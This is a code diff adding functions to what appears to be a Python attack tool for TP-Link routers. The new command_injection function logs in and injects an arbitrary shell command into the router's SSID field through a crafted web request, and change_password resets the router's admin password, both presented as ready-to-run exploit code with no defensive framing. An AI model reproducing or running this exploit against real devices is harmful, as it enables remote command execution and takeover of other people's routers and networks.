@@ -237,4 +237,51 @@ def lightshow(target_url: str, password: str):
                 break
             time.sleep(0.1)
 
+def command_injection(target_url: str, password: str, command: str) -> None:
+    print(f"[*] Executing {command} on TP-Link router")
+    token = generate_tp_link_auth_token(password)
+    session_id = get_sessionID(target_url, token)
 
+    session_cookie = {"Authorization": token}
+    referer = f"{target_url}{session_id}/userRpm/MenuRpm.htm"
+    headers = {
+            "Referer": referer,
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+    }
+
+    try:
+        response = requests.get(target_url+session_id+"/userRpm/WlanNetworkRpm.html?ssid=;"+command+";&ssid2=TP-LINK_0000_2&ssid3=TP-LINK_0000_3&ssid4=TP-LINK_0000_4&region=101&band=0&mode=5&chanWidth=1&channel=9&rate=59&ap=1&broadcast=2&brlssid=&brlbssid=&addrType=1&keytype=1&wepindex=1&authtype=1&keytext=&Save=Save",cookies=session_cookie,headers=headers)
+        print(f"[+] Command executed successfully!")
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Connection error: {e}")
+
+def encode_password(password: str) ->str:
+    password_md5 = hashlib.md5(password.encode('utf-8')).hexdigest()
+    b64_bytes = base64.b64encode(password_md5.encode('utf-8'))
+    hash_string = b64_bytes.decode('utf-8')
+    return urllib.parse.quote(hash_string)
+
+def change_password(target_url: str, current_password: str, new_password: str) -> str:
+    print(f"[*] Changing Admin password to {new_password} on TP-Link router")
+    token = generate_tp_link_auth_token(current_password)
+    session_id = get_sessionID(target_url, token)
+
+    session_cookie = {"Authorization": token}
+    referer = f"{target_url}{session_id}/userRpm/ChangeLoginPwdRpm.htm"
+    headers = {
+        "Referer": referer,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+    }
+    
+    old_pass = encode_password(current_password)
+    new_pass = encode_password(new_password)
+    try:
+        response = requests.get(target_url+session_id+"/userRpm/ChangeLoginPwdRpm.htm?oldname=admin&oldpassword="+old_pass+"&newname=admin&newpassword="+new_pass+"&newpassword2="+new_pass+"&Save=Save")
+        if response.status_code == 200 and "httpAutErrorArray" not in response.text:
+            print(f"[+] Password changed successfully!")
+        else:
+            print(f"[-] Password was not able to be changed successfully (Try again with a different password)")
+
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Connection error: {e}")
+        
